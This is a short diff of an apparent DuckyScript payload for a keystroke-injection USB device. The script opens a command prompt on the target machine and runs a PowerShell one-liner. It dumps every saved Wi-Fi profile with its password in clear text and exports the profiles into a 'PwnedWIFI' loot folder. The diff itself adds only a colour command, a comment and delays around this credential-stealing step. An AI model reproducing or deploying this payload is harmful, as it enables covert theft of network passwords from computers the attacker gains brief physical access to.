@@ -15,9 +15,13 @@ DELAY 100
 STRINGLN cmd
 ENTER
 DELAY 500
+STRINGLN color FE
+DELAY 100
+REM Fetch and Save
 STRING powershell -c "netsh wlan show profiles | Select-String 'All User Profile\s*:\s*(.+)' | ForEach-Object { $_ -match 'All User Profile\s*:\s*(.+)'; $matches[1] } | ForEach-Object { netsh wlan show profile name=$_ key=clear } | Out-File -FilePath 'D:\loot\PwnedWIFI\all_wifi_info.txt'; netsh wlan export profile key=clear | Out-File -Append -FilePath 'D:\loot\PwnedWIFI\all_wifi_passwords.txt';"
 ENTER
 DELAY 300
 STRING exit
 ENTER
+DELAY 500
 ATTACKMODE OFF
